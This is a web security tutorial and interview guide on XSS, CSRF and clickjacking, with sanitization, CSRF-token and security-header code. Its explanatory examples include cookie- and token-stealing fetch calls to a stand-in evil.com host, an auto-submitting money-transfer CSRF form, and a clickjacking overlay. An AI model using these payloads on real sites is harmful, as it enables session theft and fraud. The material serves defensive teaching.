# Frontend Security: XSS, CSRF, and Clickjacking

## 1. What is it?
Frontend Security represents the layer of defensive architecture, browser security policies, sanitization mechanisms, and token validations designed to defend client-side web applications against malicious exploitation. The three most prevalent web vulnerabilities targeted at browsers are:
1. **XSS (Cross-Site Scripting):** An attacker injects malicious client-side script into an application which executes within the victim browser's execution context, compromising session tokens, DOM integrity, or keystrokes.
2. **CSRF (Cross-Site Request Forgery):** A malicious website tricks an authenticated user's browser into transmitting unauthorized state-changing HTTP requests to a vulnerable application where the user is currently authenticated via ambient credentials (cookies).
3. **Clickjacking (UI Redressing):** An attacker overlays an invisible or transparent iframe containing a target application over an enticing clickable element on a malicious website, tricking users into performing unintended critical operations.

```
+-------------------------------------------------------------------------------+
|                      COMMON FRONTEND ATTACK VECTORS                           |
+-----------------------+-------------------------------+-----------------------+
|        XSS            |             CSRF              |      CLICKJACKING     |
+-----------------------+-------------------------------+-----------------------+
| Injects untrusted JS  | Hijacks browser ambient auth  | Transparents an       |
| into DOM context.     | (cookies) to forge state      | iframe over lure UI   |
| Steals tokens,        | mutation requests on another  | to hijack physical    |
| exfiltrates keystrokes| authenticated domain.         | mouse clicks.         |
+-----------------------+-------------------------------+-----------------------+
```

---

## 2. Why does it exist?
The browser's fundamental operational model is founded upon two competing principles:
1. **The Same-Origin Policy (SOP):** Restricts how a document or script loaded by one origin can interact with a resource from another origin.
2. **Web Openness & Interactivity:** Browsers intentionally allow cross-origin embedding of scripts (`<script>`), stylesheets (`<link>`), images (`<img>`), and form submissions (`<form method="POST">`) without preflight restrictions to ensure global web interoperability.

Vulnerabilities exist because browsers automatically attach ambient domain cookies on cross-origin requests by default (historical RFC specs), parse untrusted dynamic HTML strings as executable instructions unless explicitly sanitized, and permit cross-origin framing unless forbidden by explicit security response headers.

---

## 3. Mental Model
Think of the browser security posture as a three-tier castle defense:
- **XSS Defense is "Input Sterilization & Content Integrity":** If you allow outside visitors into your castle, you disarm them (escape HTML entities), inspect their gifts (DOMPurify sanitization), and install security cameras that shoot unauthorized weapons on sight (CSP - Content Security Policy).
- **CSRF Defense is "One-Time Secret Handshakes":** Just because someone arrives bearing your castle's wax seal (session cookie) doesn't prove they intentionally sent the letter; they must also provide a private handshake token known only inside your castle walls (Anti-CSRF synchronizer token / `SameSite=Strict`).
- **Clickjacking Defense is "Anti-Periscope Cloaking":** You forbid enemy castles from projecting a see-through periscope portal into your throne room (`X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`).

```
XSS INJECTION:
Untrusted Input ---> [ InnerHTML / eval ] ---> Arbitrary Script Runs in Origin Context

CSRF FORGERY:
Attacker Site ---> [ <form action="bank.com/transfer"> ] ---> Browser Attaches bank.com Cookies Auto

CLICKJACKING:
Attacker Button [ Play Video ]
       ^ (underneath)
Iframe [ bank.com/confirm-delete (opacity: 0.001) ] ---> User clicks "Play" -> Triggers "Delete"
```

---

## 4. Basic Example

### Vulnerable DOM Injection vs Safe Sanitized Rendering
```typescript
import React from 'react';
import DOMPurify from 'dompurify';

interface CommentProps {
  untrustedUserMarkup: string;
}

export const SafeCommentView: React.FC<CommentProps> = ({ untrustedUserMarkup }) => {
  // DANGEROUS: Executes raw script tags or onerror attributes
  // <div dangerouslySetInnerHTML={{ __html: untrustedUserMarkup }} />

  // SAFE: DOMPurify scrubs executable vectors (script tags, inline event handlers, javascript: pseudo-protocols)
  const sanitizedMarkup = DOMPurify.sanitize(untrustedUserMarkup, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
  });

  return (
    <article className="user-comment">
      <h3>User Review</h3>
      <div dangerouslySetInnerHTML={{ __html: sanitizedMarkup }} />
    </article>
  );
};
```

---

## 5. Real Example

### Complete Anti-CSRF Token Interceptor & Frame-Busting Defense
```typescript
// frontend/src/api/client.ts
import axios from 'axios';

// 1. Double Submit Cookie / Header CSRF Pattern
function getCsrfTokenFromCookie(): string | null {
  const match = document.cookie.match(new RegExp('(^| )XSRF-TOKEN=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}

export const apiClient = axios.create({
  baseURL: '/api/v1',
  withCredentials: true, // Send HTTP-only session cookies
});

// Attach CSRF custom header to state-changing requests
apiClient.interceptors.request.use((config) => {
  const method = config.method?.toUpperCase();
  if (method === 'POST' || method === 'PUT' || method === 'PATCH' || method === 'DELETE') {
    const token = getCsrfTokenFromCookie();
    if (token) {
      config.headers['X-CSRF-Token'] = token;
    }
  }
  return config;
});

// 2. Legacy Framebusting fallback (Client-side defense against Clickjacking)
if (window.top !== window.self) {
  // If running inside an iframe, force breakout or blank the viewport
  window.top.location = window.self.location;
}
```

### Express.js Security Headers (Defense-in-Depth against Clickjacking & XSS)
```typescript
// backend/src/middleware/securityHeaders.ts
import { Request, Response, NextFunction } from 'express';

export function configureSecurityHeaders(req: Request, res: Response, next: NextFunction) {
  // 1. Anti-Clickjacking: Disallow any iframe embedding
  res.setHeader('X-Frame-Options', 'DENY');

  // 2. Modern CSP: Frame ancestors forbid framing, default-src locks script sources
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; frame-ancestors 'none'; object-src 'none'; base-uri 'self';"
  );

  // 3. Prevent MIME-sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // 4. Referrer policy to prevent token leakage in query params
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  next();
}
```

---

## 6. Under the Hood

### Browser Execution Paths & Vulnerability Mechanics

#### 1. XSS Mechanisms
- **Stored XSS:** Malicious payload is permanently saved into database (e.g., bio profile with `<script src="https://evil.com/leak.js"></script>`). Whenever any user views the profile, the raw HTML is served and executed.
- **Reflected XSS:** The attack payload is reflected off the web server in an immediate error or search page (e.g., `https://site.com/search?q=<script>fetch('evil.com?c='+document.cookie)</script>`).
- **DOM-based XSS:** Purely client-side vulnerability. Occurs when client JS reads data from an untrusted source (`window.location.search`, `hash`, `document.referrer`) and passes it directly to an execution sink (`eval()`, `innerHTML`, `document.write()`, `setTimeout(string)`).

#### 2. CSRF Mechanics
When an unsuspecting user visits `https://malicious-site.com`, that page contains:
```html
<form action="https://bank.com/api/transfer" method="POST" id="hackForm">
  <input type="hidden" name="toAccount" value="attacker_account_999" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.getElementById('hackForm').submit();</script>
```
Because the browser makes a standard top-level cross-origin form POST, it automatically appends all cookies belonging to `bank.com` (if `SameSite` is `None` or legacy default). The bank server validates the cookie, assumes the user willingly initiated the transfer, and deducts the funds.

#### 3. Clickjacking Mechanics
Attacker constructs an overlay using CSS:
```html
<style>
  .decoy-button { position: absolute; top: 100px; left: 100px; z-index: 1; }
  .target-iframe {
    position: absolute; top: 100px; left: 100px;
    opacity: 0.0001; /* Invisible to the eye */
    z-index: 2; /* Sits directly on top of the decoy button */
  }
</style>
<button class="decoy-button">Claim $1,000 Free Bonus!</button>
<iframe class="target-iframe" src="https://social.com/settings/delete-account"></iframe>
```
The user aims their cursor at the decoy button and clicks. The browser routes the physical mouse event to the top-most z-index element (`target-iframe`), clicking "Confirm Delete Account".

---

## 7. Important Rules
1. **Never Trust Client-Side Sanitization Exclusively:** All sanitization on the client is for user experience. The backend server must enforce schema validation, output encoding, and authorization checks.
2. **Cookies Must Use Proper Security Flags:**
   - `HttpOnly`: Prevents JavaScript accessing cookies via `document.cookie` (neutralizes token theft via XSS).
   - `Secure`: Cookie only transmitted over HTTPS.
   - `SameSite=Strict` or `SameSite=Lax`: Prevents cross-site cookie transmission, completely mitigating CSRF.
3. **CSP Is Your Strongest Defense Against XSS:** Implement a nonce-based or strict-origin CSP header to kill unauthorized inline scripts.
4. **Prefer React's Default Escaping:** React automatically escapes dynamic string bindings inside JSX (`<div>{userContent}</div>`), preventing HTML execution. Only `dangerouslySetInnerHTML` bypasses this protection.

---

## 8. Common Mistakes

### Mistake 1: Relying on Storing JWTs in `localStorage`
```typescript
// DANGEROUS: Any XSS vulnerability on the page or 3rd-party npm package can steal the JWT instantly
localStorage.setItem('auth_token', token);
const stolen = localStorage.getItem('auth_token');
fetch('https://evil.com/exfiltrate?token=' + stolen);
```
**Fix:** Store session identifiers in `HttpOnly`, `Secure`, `SameSite=Strict` cookies.

### Mistake 2: Using `dangerouslySetInnerHTML` Without DOMPurify
```typescript
// DANGEROUS:
<div dangerouslySetInnerHTML={{ __html: post.content }} />

// SECURE:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }} />
```

### Mistake 3: Believing `target="_blank"` Is Safe Without Attribute Guards
```html
<!-- DANGEROUS: Opens reverse-tabnabbing attack where the opened page has access to window.opener.location -->
<a href="https://untrusted-site.com" target="_blank">Click Here</a>

<!-- SECURE: -->
<a href="https://untrusted-site.com" target="_blank" rel="noopener noreferrer">Click Here</a>
```

---

## 9. Best Practices
1. **Adopt CSP Level 3 Nonce Strategy:**
   ```http
   Content-Security-Policy: script-src 'nonce-RANDOM_BASE64_TOKEN' 'strict-dynamic'; object-src 'none'; base-uri 'none';
   ```
2. **Enforce `SameSite=Lax` or `SameSite=Strict` Cookies:** Modern browsers default to `SameSite=Lax`, but critical financial or enterprise mutations should require `SameSite=Strict` and re-authentication.
3. **Double Submit Cookie or Synchronizer Token Pattern:** Validate unique server-generated CSRF tokens on every state-mutating verb (POST, PUT, DELETE, PATCH).
4. **Eliminate Dangerous DOM Sinks:** Completely avoid `eval()`, `new Function()`, `setTimeout("codeString")`, and `document.write()`.
5. **Frame-Ancestors Header:** Always set `Content-Security-Policy: frame-ancestors 'self'` or `'none'` to supersede `X-Frame-Options`.

---

## 10. Performance Considerations
- **DOMPurify Benchmarks:** DOMPurify creates an in-memory `DOMImplementation` or HTML document fragment to parse and traverse elements. For a 10KB HTML string, sanitization takes ~1-3ms on modern hardware. For infinite-scroll feeds with hundreds of HTML elements, sanitize on the server or web worker to prevent main-thread jank.
- **CSP Nonce Generation:** Generating a cryptographically secure random nonce per HTTP request (via `crypto.randomBytes(16)`) is ultra-fast (<0.02ms) and introduces negligible overhead.

---

## 11. Security Considerations
- **Content Security Policy Bypass via Trusted CDNs:** If your CSP specifies `script-src https://cdnjs.cloudflare.com`, an attacker can include an outdated AngularJS library hosted on the same CDN that executes an expression-injection payload, bypassing CSP. Prefer nonce-based strict CSPs.
- **SVG XSS Payloads:** SVGs are full XML documents capable of executing `<script>` tags and onload event attributes (`<svg onload="alert(1)">`). Always sanitize SVGs with dedicated XML/SVG sanitizers before rendering inline.

---

## 12. Alternatives
- **XSS Prevention via Iframe Sandboxing:** Instead of running user HTML directly, render it inside an `<iframe sandbox="allow-scripts" srcdoc={content}>` with a restricted sandbox attribute (disallowing `allow-same-origin`). This isolates the untrusted payload into a null origin.
- **CSRF Tokenless Defense via Custom Headers:** Fetch requests with custom headers (`X-Requested-With` or `X-App-Client`) trigger CORS preflight (`OPTIONS`), preventing simple cross-origin form submissions from executing.

---

## 13. Trade-offs

| Defense Strategy | Pros | Cons / Gotchas |
| :--- | :--- | :--- |
| **HttpOnly Cookies** | Immune to XSS token theft | Vulnerable to CSRF unless protected by `SameSite` & anti-CSRF tokens. |
| **LocalStorage Tokens** | Immune to CSRF; simple SPA client architecture | Completely vulnerable to XSS token exfiltration. |
| **Strict CSP Headers** | Blocks unauthorized inline scripts & external domains | Hard to configure; breaks third-party analytics/widgets if not whitelisted. |
| **DOMPurify Client-Side** | Smooth UX; cleans raw markup | Adds ~18KB to bundle size; client can be tampered with by malicious browser extensions. |

---

## 14. Real-World Usage
- **GitHub / GitLab Markdown Rendering:** Untrusted user markdown is converted to HTML, passed through strict whitelist-based HTML sanitizers, and rendered inside isolated preview sandboxes.
- **Stripe Elements:** Payment card input fields are loaded inside isolated, domain-separated iframes hosted directly on Stripe's origin (`js.stripe.com`). This ensures the parent merchant's application scripts can never access raw credit card keystrokes even in the event of an XSS compromise.

---

## 15. Placement Interview Questions

### Basic
**Q: What is the primary difference between XSS and CSRF?**  
*Answer:* In XSS, an attacker runs their malicious JavaScript code inside the victim's browser within the context of the trusted application. In CSRF, the attacker does not execute script inside the target application; instead, they exploit the browser's automatic credential attachment (cookies) to trick the victim's browser into making an unauthorized cross-origin request to the target application.

### Conceptual
**Q: How does `SameSite` cookie attribute work, and what are the differences between `Strict`, `Lax`, and `None`?**  
*Answer:*
- `Strict`: The cookie is never sent in cross-site requests (e.g., following a link from Google or submitting an external form). Offers the highest CSRF protection.
- `Lax`: The cookie is withheld on cross-site subrequests (images, iframes, cross-site POST forms), but sent when a user navigates to the origin site via top-level link clicks (`<a href>`).
- `None`: The cookie is sent on all cross-site requests, but requires the `Secure` attribute (HTTPS).

### Implementation
**Q: Write a utility function that validates and sanitizes a URL before setting it to an `<a href>` to prevent `javascript:` XSS attacks.**  
*Answer:*
```typescript
export function sanitizeUrl(url: string): string {
  const sanitized = url.trim();
  // Disallow javascript: and data: pseudo-protocols
  const invalidProtocolRegex = /^(javascript:|data:|vbscript:)/i;
  
  if (invalidProtocolRegex.test(sanitized)) {
    return 'about:blank';
  }
  return sanitized;
}
```

### Debugging
**Q: An engineer added `X-Frame-Options: DENY` to their site, but modern browsers report it is being overridden or ignored. Why?**  
*Answer:* If the server also sends `Content-Security-Policy: frame-ancestors ...`, modern browsers follow CSP Level 2/3 specifications where `frame-ancestors` supersedes `X-Frame-Options`. If `frame-ancestors *` was accidentally configured in CSP, it overrides the `X-Frame-Options: DENY`.

### Scenario
**Q: You are building a banking dashboard SPA. Should you store the user authentication token in `localStorage`, `sessionStorage`, or an `HttpOnly` cookie?**  
*Answer:* Store authentication tokens in an `HttpOnly`, `Secure`, `SameSite=Strict` cookie. If tokens reside in `localStorage` or `sessionStorage`, any XSS vulnerability or malicious dependency can read `window.localStorage` and exfiltrate the full session credential. With `HttpOnly` cookies, JavaScript cannot access the token value, limiting the blast radius of an XSS attack.

### Advanced
**Q: Explain how an attacker can perform a DOM XSS attack via `window.postMessage`, and how to properly secure message event listeners.**  
*Answer:* If an application registers `window.addEventListener('message', (event) => { eval(event.data); })` without validating the origin, any third-party malicious iframe can post a message executing arbitrary code. To fix this, always verify `event.origin === 'https://trusted-domain.com'` before processing data, and validate data against a strict schema.

---

## 16. Coding Questions

### Problem: Write a Safe HTML Parser Hook with DOMPurify and Configuration Cache
```typescript
import { useMemo } from 'react';
import DOMPurify from 'dompurify';

interface SanitizerOptions {
  allowedTags?: string[];
  allowedAttributes?: string[];
}

export function useSanitizedHtml(dirtyHtml: string, options?: SanitizerOptions) {
  const cleanHtml = useMemo(() => {
    if (!dirtyHtml) return '';
    
    return DOMPurify.sanitize(dirtyHtml, {
      ALLOWED_TAGS: options?.allowedTags || ['p', 'b', 'i', 'strong', 'em', 'ul', 'li', 'ol', 'a', 'code', 'pre'],
      ALLOWED_ATTR: options?.allowedAttributes || ['href', 'target', 'rel', 'class'],
      FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed'],
      FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
    });
  }, [dirtyHtml, options?.allowedTags, options?.allowedAttributes]);

  return { __html: cleanHtml };
}
```

---

## 17. Common Interview Traps
- **Trap 1:** "If I use React, my application is 100% immune to XSS."  
  *Truth:* False. React escapes string children, but you can still introduce XSS via:
  1. `dangerouslySetInnerHTML`
  2. Untrusted URLs in `<a href={userUrl}>` (e.g. `javascript:alert(1)`)
  3. Direct DOM manipulations via `ref.current.innerHTML`
  4. Server-Side Rendering (SSR) hydration state injection (`window.__PRELOADED_STATE__ = ${JSON.stringify(data)}`).
- **Trap 2:** "CSRF attacks only steal data from the user."  
  *Truth:* CSRF cannot read response data due to Same-Origin Policy! CSRF is purely an unauthorized **state-changing** attack (initiating transfers, changing passwords, submitting orders).

---

## 18. Revision Summary
- **XSS** executes unauthorized script in the origin context (Stored, Reflected, DOM). Mitigate via context-aware output encoding, DOMPurify, React default escaping, and strict CSP headers.
- **CSRF** exploits automatic cookie transmission on cross-origin requests. Mitigate via `SameSite=Strict/Lax` cookies, anti-CSRF synchronization tokens, and custom header checks.
- **Clickjacking** hijacks clicks via invisible transparent iframes. Mitigate via `Content-Security-Policy: frame-ancestors 'none'` and `X-Frame-Options: DENY`.
- Always store sensitive tokens in `HttpOnly`, `Secure` cookies rather than `localStorage`.

---

## 19. Quick Reference

```
+-------------------+-------------------------------------------+----------------------------------------------+
| Attack            | Primary Vector                            | Gold Standard Defense                        |
+-------------------+-------------------------------------------+----------------------------------------------+
| XSS               | Injected dynamic markup / execution sinks | React JSX escaping, DOMPurify, Nonce CSP     |
| CSRF              | Ambient cookie attachment on forms        | SameSite=Strict/Lax cookies, CSRF tokens     |
| Clickjacking      | Hidden iframe overlaying clickable button | CSP frame-ancestors 'none', X-Frame-Options  |
| Token Theft       | Reading localStorage via script           | Set HttpOnly & Secure cookie flags           |
| Reverse Tabnabbing| a target="_blank" modifying window.opener | Add rel="noopener noreferrer"                |
+-------------------+-------------------------------------------+----------------------------------------------+
```
